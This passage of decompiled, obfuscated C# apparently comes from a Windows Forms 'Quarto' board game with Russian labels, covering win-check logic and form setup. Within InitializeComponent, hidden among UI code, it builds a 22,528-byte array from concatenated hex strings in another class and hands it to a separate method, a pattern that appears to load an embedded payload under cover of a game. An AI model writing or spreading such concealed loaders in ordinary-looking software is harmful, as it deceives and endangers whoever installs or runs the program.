						num = -996952321;
						num57 = -996952321;
					}
					else
					{
						num = -825652670;
						num57 = -825652670;
					}
					continue;
				}
				case 64u:
					if (mem[0, num3] != null)
					{
						num = -1457841546;
						continue;
					}
					goto IL_0264;
				case 63u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = -1072561858;
						continue;
					}
					goto IL_01d6;
				case 62u:
				{
					int num31;
					int num32;
					if (mem[num3, 0].Big == mem[num3, 1].Big)
					{
						num31 = 471902079;
						num32 = 471902079;
					}
					else
					{
						num31 = 1831334742;
						num32 = 1831334742;
					}
					num = num31 ^ ((int)num2 * -474289115);
					continue;
				}
				case 61u:
				{
					int num17;
					if (mem[0, num3].Point == mem[1, num3].Point)
					{
						num = -569972684;
						num17 = -569972684;
					}
					else
					{
						num = -452273002;
						num17 = -452273002;
					}
					continue;
				}
				case 60u:
					if (mem[0, num3].Square == mem[1, num3].Square)
					{
						num = -2009816525;
						continue;
					}
					goto IL_032f;
				case 59u:
				{
					int num69;
					if (mem[num3, 0].Point != mem[num3, 1].Point)
					{
						num = -1120943722;
						num69 = -1120943722;
					}
					else
					{
						num = -94823455;
						num69 = -94823455;
					}
					continue;
				}
				case 58u:
					if (mem[num3, 2].Point != mem[num3, 3].Point)
					{
						num = ((int)num2 * -1146913149) ^ -2107335217;
						continue;
					}
					goto IL_007a;
				case 57u:
				{
					int num52;
					int num53;
					if (mem[1, 1].Dark == mem[2, 2].Dark)
					{
						num52 = 1202743827;
						num53 = 1202743827;
					}
					else
					{
						num52 = 1419161199;
						num53 = 1419161199;
					}
					num = num52 ^ ((int)num2 * -1473526749);
					continue;
				}
				case 56u:
				{
					int num47;
					int num48;
					if (!flag3)
					{
						num47 = -670783721;
						num48 = -670783721;
					}
					else
					{
						num47 = -1013858764;
						num48 = -1013858764;
					}
					num = num47 ^ ((int)num2 * -968340423);
					continue;
				}
				case 55u:
				{
					int num39;
					int num40;
					if (mem[num3, 2] == null)
					{
						num39 = 2086759051;
						num40 = 2086759051;
					}
					else
					{
						num39 = 375174311;
						num40 = 375174311;
					}
					num = num39 ^ (int)(num2 * 522243480);
					continue;
				}
				case 54u:
				{
					int num30;
					if (mem[0, 0].Square != mem[1, 1].Square)
					{
						num = -1662253979;
						num30 = -1662253979;
					}
					else
					{
						num = -1266050144;
						num30 = -1266050144;
					}
					continue;
				}
				case 53u:
				{
					int num23;
					int num24;
					if (mem[0, 3].Big == mem[1, 2].Big)
					{
						num23 = -356808305;
						num24 = -356808305;
					}
					else
					{
						num23 = -1039084827;
						num24 = -1039084827;
					}
					num = num23 ^ (int)(num2 * 908061805);
					continue;
				}
				case 52u:
				{
					int num13;
					int num14;
					if (mem[1, num3].Dark == mem[2, num3].Dark)
					{
						num13 = -933838427;
						num14 = -933838427;
					}
					else
					{
						num13 = -580692947;
						num14 = -580692947;
					}
					num = num13 ^ ((int)num2 * -376952426);
					continue;
				}
				case 51u:
				{
					int num15;
					int num16;
					if (mem[1, 2].Dark != mem[2, 1].Dark)
					{
						num15 = 1261372173;
						num16 = 1261372173;
					}
					else
					{
						num15 = 1135276753;
						num16 = 1135276753;
					}
					num = num15 ^ (int)(num2 * 76122366);
					continue;
				}
				case 50u:
					if (mem[2, 1] != null)
					{
						num = (int)((num2 * 354871687) ^ 0x573FD31);
						continue;
					}
					goto IL_01d6;
				case 49u:
					num = (int)(num2 * 419549963) ^ -1774553621;
					continue;
				case 48u:
					flag = true;
					num = ((int)num2 * -694464620) ^ -1180463727;
					continue;
				case 47u:
					if (mem[2, num3] != null)
					{
						num = (int)(num2 * 914167572) ^ -1249689014;
						continue;
					}
					goto IL_0264;
				case 46u:
				{
					int num63;
					if (mem[0, 0].Dark == mem[1, 1].Dark)
					{
						num = -1180403747;
						num63 = -1180403747;
					}
					else
					{
						num = -1547403161;
						num63 = -1547403161;
					}
					continue;
				}
				case 45u:
				{
					int num58;
					int num59;
					if (flag2)
					{
						num58 = -448855831;
						num59 = -448855831;
					}
					else
					{
						num58 = -2102867785;
						num59 = -2102867785;
					}
					num = num58 ^ ((int)num2 * -1177423363);
					continue;
				}
				case 44u:
				{
					int num54;
					int num55;
					if (mem[0, 0] == null)
					{
						num54 = 1537024100;
						num55 = 1537024100;
					}
					else
					{
						num54 = 997525480;
						num55 = 997525480;
					}
					num = num54 ^ (int)(num2 * 1653343511);
					continue;
				}
				case 43u:
				{
					int num43;
					int num44;
					if (mem[1, 1].Square != mem[2, 2].Square)
					{
						num43 = 385839331;
						num44 = 385839331;
					}
					else
					{
						num43 = 1980430809;
						num44 = 1980430809;
					}
					num = num43 ^ ((int)num2 * -1358224242);
					continue;
				}
				case 42u:
				{
					int num35;
					int num36;
					if (mem[1, 2].Big != mem[2, 1].Big)
					{
						num35 = -702469370;
						num36 = -702469370;
					}
					else
					{
						num35 = -1890442085;
						num36 = -1890442085;
					}
					num = num35 ^ (int)(num2 * 1245206538);
					continue;
				}
				case 41u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = ((int)num2 * -2015725844) ^ 0x426DDB1E;
						continue;
					}
					goto IL_01ca;
				case 40u:
					if (mem[1, 2] != null)
					{
						num = (int)((num2 * 1170309237) ^ 0x598F88D4);
						continue;
					}
					goto IL_01d6;
				case 39u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = ((int)num2 * -1562417654) ^ -1737239090;
						continue;
					}
					goto IL_01ca;
				case 38u:
				{
					int num25;
					int num26;
					if (mem[1, num3].Point != mem[2, num3].Point)
					{
						num25 = -1237044726;
						num26 = -1237044726;
					}
					else
					{
						num25 = -996826349;
						num26 = -996826349;
					}
					num = num25 ^ (int)(num2 * 493052764);
					continue;
				}
				case 37u:
				{
					int num20;
					int num21;
					if (mem[2, 2] != null)
					{
						num20 = -1052967745;
						num21 = -1052967745;
					}
					else
					{
						num20 = -1492394207;
						num21 = -1492394207;
					}
					num = num20 ^ ((int)num2 * -1748387378);
					continue;
				}
				case 36u:
				{
					int num11;
					int num12;
					if (mem[num3, 1].Dark == mem[num3, 2].Dark)
					{
						num11 = -324966183;
						num12 = -324966183;
					}
					else
					{
						num11 = -1067400499;
						num12 = -1067400499;
					}
					num = num11 ^ (int)(num2 * 2119185047);
					continue;
				}
				case 35u:
				{
					int num6;
					int num7;
					if (mem[num3, 3] != null)
					{
						num6 = 17137473;
						num7 = 17137473;
					}
					else
					{
						num6 = 952523815;
						num7 = 952523815;
					}
					num = num6 ^ ((int)num2 * -256495494);
					continue;
				}
				case 34u:
				{
					int num70;
					int num71;
					if (mem[num3, 1].Square != mem[num3, 2].Square)
					{
						num70 = -1477291099;
						num71 = -1477291099;
					}
					else
					{
						num70 = -1679326372;
						num71 = -1679326372;
					}
					num = num70 ^ ((int)num2 * -2114259881);
					continue;
				}
				case 33u:
				{
					int num68;
					if (mem[num3, 0].Square != mem[num3, 1].Square)
					{
						num = -439019933;
						num68 = -439019933;
					}
					else
					{
						num = -1784562385;
						num68 = -1784562385;
					}
					continue;
				}
				case 32u:
				{
					int num64;
					int num65;
					if (mem[num3, 1] == null)
					{
						num64 = 2123793379;
						num65 = 2123793379;
					}
					else
					{
						num64 = 998366570;
						num65 = 998366570;
					}
					num = num64 ^ ((int)num2 * -1682875461);
					continue;
				}
				case 31u:
					if (mem[1, num3] != null)
					{
						num = (int)((num2 * 235271116) ^ 0x1E71616F);
						continue;
					}
					goto IL_0264;
				case 30u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = ((int)num2 * -1280847487) ^ -2131057898;
						continue;
					}
					goto IL_01ca;
				case 29u:
				{
					int num60;
					if (mem[0, 3].Dark != mem[1, 2].Dark)
					{
						num = -1736424257;
						num60 = -1736424257;
					}
					else
					{
						num = -753718750;
						num60 = -753718750;
					}
					continue;
				}
				case 28u:
				{
					int num56;
					if (mem[num3, 0].Dark == mem[num3, 1].Dark)
					{
						num = -818234909;
						num56 = -818234909;
					}
					else
					{
						num = -731507993;
						num56 = -731507993;
					}
					continue;
				}
				case 27u:
				{
					int num49;
					int num50;
					if (mem[1, 1].Big != mem[2, 2].Big)
					{
						num49 = 1011157542;
						num50 = 1011157542;
					}
					else
					{
						num49 = 1712118581;
						num50 = 1712118581;
					}
					num = num49 ^ ((int)num2 * -1819553411);
					continue;
				}
				case 25u:
				{
					int num45;
					int num46;
					if (mem[num3, 1].Point != mem[num3, 2].Point)
					{
						num45 = 331381802;
						num46 = 331381802;
					}
					else
					{
						num45 = 1835228874;
						num46 = 1835228874;
					}
					num = num45 ^ ((int)num2 * -1339892921);
					continue;
				}
				case 24u:
					num = -479022590;
					continue;
				case 23u:
					num22 = ((mem[2, num3].Square == mem[3, num3].Square) ? 1 : 0);
					goto IL_007b;
				case 22u:
					if (mem[num3, 2].Square != mem[num3, 3].Square)
					{
						num = ((int)num2 * -940563723) ^ 0x425D58C8;
						continue;
					}
					goto IL_007a;
				case 21u:
					result = flag;
					num = -163329142;
					continue;
				case 20u:
				{
					int num37;
					int num38;
					if (mem[0, num3].Big != mem[1, num3].Big)
					{
						num37 = 1686197143;
						num38 = 1686197143;
					}
					else
					{
						num37 = 512327980;
						num38 = 512327980;
					}
					num = num37 ^ ((int)num2 * -151587443);
					continue;
				}
				case 19u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = ((int)num2 * -728383549) ^ 0x3C1F7148;
						continue;
					}
					goto IL_01ca;
				case 18u:
					if (mem[2, num3].Point != mem[3, num3].Point)
					{
						num = (int)((num2 * 1520526388) ^ 0x4A21069E);
						continue;
					}
					goto IL_0b0d;
				case 17u:
					flag2 = num3 < 4;
					num = -1651055876;
					continue;
				case 16u:
				{
					int num33;
					int num34;
					if (mem[1, num3].Big != mem[2, num3].Big)
					{
						num33 = 2081826392;
						num34 = 2081826392;
					}
					else
					{
						num33 = 1373709730;
						num34 = 1373709730;
					}
					num = num33 ^ (int)(num2 * 1746414280);
					continue;
				}
				case 15u:
				{
					int num28;
					int num29;
					if (mem[1, 2].Point != mem[2, 1].Point)
					{
						num28 = 1374022964;
						num29 = 1374022964;
					}
					else
					{
						num28 = 438266598;
						num29 = 438266598;
					}
					num = num28 ^ (int)(num2 * 339572951);
					continue;
				}
				case 14u:
					num3 = 0;
					num = (int)(num2 * 756343954) ^ -130401958;
					continue;
				case 13u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = ((int)num2 * -1657413839) ^ 0x184E9EB9;
						continue;
					}
					goto IL_01ca;
				case 12u:
					if (mem[0, 3] != null)
					{
						num = -792533062;
						continue;
					}
					goto IL_01d6;
				case 11u:
					if (mem[1, num3].Square == mem[2, num3].Square)
					{
						num = ((int)num2 * -1907319682) ^ 0x3EB0B615;
						continue;
					}
					goto IL_032f;
				case 10u:
					if (mem[2, num3].Big != mem[3, num3].Big)
					{
						num = (int)(num2 * 512178820) ^ -1286085452;
						continue;
					}
					goto IL_0b0d;
				case 9u:
					if (mem[3, 0] != null)
					{
						num = ((int)num2 * -1649422160) ^ 0x11C5406C;
						continue;
					}
					goto IL_01d6;
				case 8u:
				{
					int num18;
					int num19;
					if (mem[1, 1] != null)
					{
						num18 = 225862063;
						num19 = 225862063;
					}
					else
					{
						num18 = 1040874305;
						num19 = 1040874305;
					}
					num = num18 ^ ((int)num2 * -1237824149);
					continue;
				}
				case 7u:
					if (mem[2, num3].Dark != mem[3, num3].Dark)
					{
						num = ((int)num2 * -285245514) ^ -1076739023;
						continue;
					}
					goto IL_0b0d;
				case 6u:
				{
					int num9;
					int num10;
					if (mem[0, 0].Big == mem[1, 1].Big)
					{
						num9 = 98788663;
						num10 = 98788663;
					}
					else
					{
						num9 = 1853438260;
						num10 = 1853438260;
					}
					num = num9 ^ (int)(num2 * 1300031549);
					continue;
				}
				case 5u:
					if (mem[2, 1].Square == mem[3, 0].Square)
					{
						goto IL_01ca;
					}
					goto IL_01d6;
				case 4u:
					num3++;
					num = (int)((num2 * 1400369435) ^ 0x2F6CB1B);
					continue;
				case 3u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = (int)(num2 * 1124781066) ^ -1448386485;
						continue;
					}
					goto IL_01ca;
				case 2u:
					num = -372899549;
					continue;
				case 1u:
					if (mem[3, num3] != null)
					{
						num = (int)(num2 * 1971311701) ^ -883522979;
						continue;
					}
					goto IL_0264;
				case 0u:
				{
					int num4;
					int num5;
					if (mem[num3, 1].Big != mem[num3, 2].Big)
					{
						num4 = 1266636764;
						num5 = 1266636764;
					}
					else
					{
						num4 = 1771542362;
						num5 = 1771542362;
					}
					num = num4 ^ (int)(num2 * 833583209);
					continue;
				}
				case 26u:
					break;
				default:
					{
						return result;
					}
					IL_01d6:
					num = -1499690635;
					num8 = -1499690635;
					continue;
					IL_032f:
					num22 = 0;
					goto IL_007b;
					IL_01ca:
					num = -1175852224;
					num8 = -1175852224;
					continue;
					IL_007a:
					num22 = 1;
					goto IL_007b;
					IL_0b0d:
					num22 = 1;
					goto IL_007b;
					IL_0264:
					num22 = 0;
					goto IL_007b;
					IL_007b:
					flag3 = (byte)num22 != 0;
					num = -1706743906;
					continue;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		int num6 = default(int);
		bool flag2 = default(bool);
		int num5 = default(int);
		bool flag3 = default(bool);
		bool result = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = 1853060448;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x48553304u) % 15u)
				{
				case 13u:
					num6++;
					num = 1143133029;
					continue;
				case 12u:
					flag2 = mem[num5, num6] == null;
					num = 776951593;
					continue;
				case 11u:
					num5 = 0;
					num = (int)((num2 * 817514656) ^ 0x42699B31);
					continue;
				case 10u:
					num = (int)(num2 * 8436305) ^ -2020175611;
					continue;
				case 9u:
					num6 = 0;
					num = 1143133029;
					continue;
				case 8u:
				{
					int num7;
					if (num5 < 4)
					{
						num = 854515190;
						num7 = 854515190;
					}
					else
					{
						num = 684716027;
						num7 = 684716027;
					}
					continue;
				}
				case 6u:
					flag3 = true;
					num = ((int)num2 * -284818662) ^ 0x1A12C092;
					continue;
				case 5u:
					result = flag3;
					num = ((int)num2 * -153847752) ^ -829348081;
					continue;
				case 4u:
					num5++;
					num = ((int)num2 * -1035404728) ^ 0x6A520809;
					continue;
				case 3u:
				{
					int num8;
					int num9;
					if (!flag2)
					{
						num8 = -1333563871;
						num9 = -1333563871;
					}
					else
					{
						num8 = -1044836451;
						num9 = -1044836451;
					}
					num = num8 ^ ((int)num2 * -750965702);
					continue;
				}
				case 2u:
					flag = num6 < 4;
					num = 1987267569;
					continue;
				case 1u:
					flag3 = false;
					num = ((int)num2 * -1574746625) ^ 0x4A9C6F46;
					continue;
				case 0u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = 1365073855;
						num4 = 1365073855;
					}
					else
					{
						num3 = 128065137;
						num4 = 128065137;
					}
					num = num3 ^ ((int)num2 * -1810509300);
					continue;
				}
				case 7u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		while (true)
		{
			int num = 1362994590;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x30504738u) % 7u)
				{
				case 6u:
					Form1.smethod_32((Control)(object)label5, "Игрок: ");
					num = (int)((num2 * 594621435) ^ 0x61AE86BE);
					continue;
				case 4u:
					num = (int)(num2 * 1025976512) ^ -776780240;
					continue;
				case 2u:
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					Form1.smethod_32((Control)(object)label1, "");
					Form1.smethod_32((Control)(object)label2, "");
					num = (int)(num2 * 212604247) ^ -1340557221;
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)label6, str);
					num = (int)((num2 * 1444410045) ^ 0x20165C34);
					continue;
				case 0u:
					num = (int)(num2 * 1681872221) ^ -2049810753;
					continue;
				default:
					return;
				case 5u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing)
		{
			goto IL_0073;
		}
		int num = 0;
		goto IL_00b2;
		IL_00b2:
		bool flag = (byte)num != 0;
		int num2 = -311127657;
		goto IL_0078;
		IL_0073:
		num2 = -1774150635;
		goto IL_0078;
		IL_0078:
		while (true)
		{
			uint num3;
			switch ((num3 = (uint)num2 ^ 0xB4D8A248u) % 8u)
			{
			case 7u:
			{
				int num4;
				int num5;
				if (!flag)
				{
					num4 = -727537919;
					num5 = -727537919;
				}
				else
				{
					num4 = -1006638580;
					num5 = -1006638580;
				}
				num2 = num4 ^ (int)(num3 * 1103283347);
				continue;
			}
			case 6u:
				Form1.smethod_51((IDisposable)components);
				num2 = (int)((num3 * 1778686429) ^ 0x1BFE2D6D);
				continue;
			case 4u:
				((Form)this).Dispose(disposing);
				num2 = -822916702;
				continue;
			case 3u:
				num2 = (int)(num3 * 283103248) ^ -346344644;
				continue;
			case 1u:
				num2 = (int)(num3 * 313051386) ^ -943855956;
				continue;
			case 0u:
				break;
			default:
				return;
			case 5u:
				goto IL_00a9;
			case 2u:
				return;
			}
			break;
		}
		goto IL_0073;
		IL_00a9:
		num = ((components != null) ? 1 : 0);
		goto IL_00b2;
	}

	private void InitializeComponent()
	{
		//IL_0753: Unknown result type (might be due to invalid IL or missing references)
		//IL_075d: Expected O, but got Unknown
		int num3 = default(int);
		bool flag = default(bool);
		byte[] array = default(byte[]);
		string string_ = default(string);
		while (true)
		{
			int num = 286720856;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x3D743422u) % 119u)
				{
				case 118u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = ((int)num2 * -144868972) ^ -1129720994;
					continue;
				case 117u:
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					num = ((int)num2 * -1872908706) ^ -1361776314;
					continue;
				case 116u:
					Form1.smethod_85((Control)(object)this, "Form1");
					num = ((int)num2 * -599576861) ^ -1756658330;
					continue;
				case 115u:
					num = ((int)num2 * -1080289421) ^ -1862991254;
					continue;
				case 114u:
					Form1.smethod_64((Control)(object)panel1, 7);
					num = (int)((num2 * 1494056921) ^ 0x6BD03B6);
					continue;
				case 113u:
					num = ((int)num2 * -205094751) ^ -1751633820;
					continue;
				case 112u:
					num = (int)(num2 * 1726641855) ^ -2091871032;
					continue;
				case 111u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					num = (int)(num2 * 1565804123) ^ -1788435628;
					continue;
				case 110u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					num = (int)(num2 * 1027609771) ^ -1496141557;
					continue;
				case 108u:
					Form1.smethod_92((Control)(object)this);
					num = ((int)num2 * -1502857417) ^ -536027415;
					continue;
				case 107u:
					Form1.smethod_61((Control)(object)button1, "button1");
					num = ((int)num2 * -2016215619) ^ 0x46A48571;
					continue;
				case 106u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = (int)((num2 * 350581106) ^ 0x15E73B38);
					continue;
				case 105u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = ((int)num2 * -1089737207) ^ -300482180;
					continue;
				case 104u:
					num = (int)(num2 * 745222583) ^ -2117767743;
					continue;
				case 103u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					Form1.smethod_64((Control)(object)label5, 12);
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = (int)((num2 * 1694020031) ^ 0x398E4356);
					continue;
				case 102u:
					num = (int)(num2 * 2141777613) ^ -327033809;
					continue;
				case 101u:
					num = ((int)num2 * -872364846) ^ -1324268233;
					continue;
				case 100u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = (int)(num2 * 1074555759) ^ -826828838;
					continue;
				case 99u:
					Form1.smethod_59((Control)(object)this);
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = (int)((num2 * 750753559) ^ 0x2320AD6D);
					continue;
				case 98u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = ((int)num2 * -1037745390) ^ 0xFA96F14;
					continue;
				case 97u:
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = (int)((num2 * 1853356869) ^ 0x2DB6AECB);
					continue;
				case 96u:
					num = (int)(num2 * 363342985) ^ -295308247;
					continue;
				case 95u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = ((int)num2 * -881467615) ^ -350876550;
					continue;
				case 94u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					num = ((int)num2 * -1288788119) ^ 0x58174F51;
					continue;
				case 93u:
					num = (int)(num2 * 138349355) ^ -1028688445;
					continue;
				case 92u:
					num = ((int)num2 * -147471764) ^ 0x37B14B60;
					continue;
				case 91u:
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					num = (int)((num2 * 1379123651) ^ 0x189D11B2);
					continue;
				case 90u:
					num = ((int)num2 * -2078909081) ^ 0x60D27528;
					continue;
				case 89u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					num = ((int)num2 * -1380247589) ^ -476798228;
					continue;
				case 88u:
					num = (int)((num2 * 370073716) ^ 0x597CF8F0);
					continue;
				case 87u:
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					num = ((int)num2 * -512208033) ^ 0x381FB959;
					continue;
				case 86u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = ((int)num2 * -360593874) ^ 0x679FB08;
					continue;
				case 85u:
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					num = (int)((num2 * 1267445580) ^ 0x44582C8F);
					continue;
				case 84u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = (int)(num2 * 1309931791) ^ -524132942;
					continue;
				case 83u:
					num = (int)((num2 * 721283917) ^ 0x7C7A4D33);
					continue;
				case 82u:
					num = (int)((num2 * 817249639) ^ 0x31BA36EF);
					continue;
				case 81u:
					pictureBox1 = Form1.smethod_2();
					button2 = Form1.smethod_53();
					button1 = Form1.smethod_53();
					num = (int)(num2 * 1392289238) ^ -1903263448;
					continue;
				case 80u:
					num3 = 0;
					num = (int)(num2 * 775186208) ^ -912599860;
					continue;
				case 79u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = (int)(num2 * 1342664784) ^ -1604571808;
					continue;
				case 78u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = ((int)num2 * -1698078230) ^ -1565730392;
					continue;
				case 77u:
					num = ((int)num2 * -999144037) ^ 0x3E419484;
					continue;
				case 76u:
					num = ((int)num2 * -1611598672) ^ -1257793025;
					continue;
				case 75u:
					num = (int)(num2 * 1495156083) ^ -1382117718;
					continue;
				case 74u:
					num = (int)((num2 * 1438263504) ^ 0x131E95C1);
					continue;
				case 73u:
					richTextBox1 = Form1.smethod_54();
					panel1 = Form1.smethod_55();
					num = (int)((num2 * 1291570428) ^ 0x6EC9A976);
					continue;
				case 72u:
					num = ((int)num2 * -481921155) ^ -1648553846;
					continue;
				case 71u:
					num = (int)((num2 * 1222392131) ^ 0x2E49B841);
					continue;
				case 70u:
					num = (int)((num2 * 1581180937) ^ 0x5609423);
					continue;
				case 69u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = ((int)num2 * -1548002449) ^ -1707574262;
					continue;
				case 67u:
					flag = num3 < 22528;
					num = 1054583002;
					continue;
				case 66u:
					CharArray(array, string.Empty);
					num = (int)((num2 * 1531848018) ^ 0x3F6BB413);
					continue;
				case 65u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = ((int)num2 * -1102760147) ^ -1651530486;
					continue;
				case 64u:
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)((num2 * 1870784995) ^ 0x5BF4D648);
					continue;
				case 63u:
					Form1.smethod_64((Control)(object)label2, 9);
					num = (int)((num2 * 1789407226) ^ 0x2331D960);
					continue;
				case 62u:
					num = ((int)num2 * -22402429) ^ -1698824715;
					continue;
				case 61u:
					num = ((int)num2 * -2073725000) ^ 0x718A1DBA;
					continue;
				case 60u:
					num = (int)(num2 * 513519673) ^ -640460312;
					continue;
				case 59u:
					label5 = Form1.smethod_57();
					num = (int)((num2 * 1051845103) ^ 0x316E4AA6);
					continue;
				case 58u:
					string_ = Form1.smethod_34(string_, Veet.Xe);
					string_ = Form1.smethod_34(string_, Veet.Zr);
					num = ((int)num2 * -506104713) ^ 0x1E240D87;
					continue;
				case 57u:
					num = ((int)num2 * -1391783044) ^ 0x34DEB253;
					continue;
				case 56u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = (int)(num2 * 921191292) ^ -185211520;
					continue;
				case 55u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = (int)(num2 * 17021126) ^ -304259346;
					continue;
				case 54u:
					num = ((int)num2 * -1100264916) ^ -1310522775;
					continue;
				case 53u:
					label6 = Form1.smethod_57();
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -1338047440) ^ 0x70ED5224;
					continue;
				case 52u:
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = ((int)num2 * -238015218) ^ -144575258;
					continue;
				case 51u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = ((int)num2 * -1676302632) ^ 0x10442D31;
					continue;
				case 50u:
					Form1.smethod_72(timer1, 1000);
					num = (int)(num2 * 1135422025) ^ -2023919338;
					continue;
				case 49u:
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = (int)((num2 * 476372366) ^ 0x5744721B);
					continue;
				case 48u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					num = (int)((num2 * 2121478577) ^ 0xA73510C);
					continue;
				case 47u:
					array[num3] = Form1.smethod_69(Form1.smethod_68(string_, num3 * 2, 2), 16);
					num = ((int)num2 * -1454869652) ^ -799974336;
					continue;
				case 46u:
					num = ((int)num2 * -1264762404) ^ 0xD5021C2;
					continue;
				case 45u:
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = (int)(num2 * 1885858337) ^ -354936869;
					continue;
				case 44u:
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = ((int)num2 * -781203247) ^ 0x2C3BEB75;
					continue;
				case 43u:
					num = 740772908;
					continue;
				case 42u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					num = ((int)num2 * -1070772799) ^ -1718885854;
					continue;
				case 41u:
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = (int)((num2 * 1493592050) ^ 0x6A0243B4);
					continue;
				case 40u:
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					num = (int)(num2 * 1126369272) ^ -1161017373;
					continue;
				case 39u:
					num = ((int)num2 * -1220542690) ^ 0x15BB658E;
					continue;
				case 38u:
					Form1.smethod_61((Control)(object)label5, "label5");
					num = (int)((num2 * 2085925347) ^ 0x2BF4A988);
					continue;
				case 37u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					num = ((int)num2 * -1784850525) ^ 0x4F863535;
					continue;
				case 36u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					num = (int)(num2 * 1022095279) ^ -51785430;
					continue;
				case 35u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = (int)((num2 * 1374463943) ^ 0x15EACC80);
					continue;
				case 34u:
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 759668069) ^ -48255645;
					continue;
				case 33u:
					array = new byte[22528];
					num = (int)((num2 * 2135301413) ^ 0x32223541);
					continue;
				case 32u:
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					num = (int)(num2 * 1811009742) ^ -663177433;
					continue;
				case 31u:
					components = Form1.smethod_52();
					num = (int)(num2 * 1328593701) ^ -384911340;
					continue;
				case 30u:
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					Form1.smethod_61((Control)(object)label2, "label2");
					num = ((int)num2 * -1760404428) ^ 0x12825EA9;
					continue;
				case 29u:
					num = ((int)num2 * -1949417366) ^ -180083571;
					continue;
				case 28u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = (int)(num2 * 735761914) ^ -1320286434;
					continue;
				case 27u:
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = (int)((num2 * 445782017) ^ 0x291928E7);
					continue;
				case 26u:
					num = (int)((num2 * 701807488) ^ 0x6CAB5452);
					continue;
				case 25u:
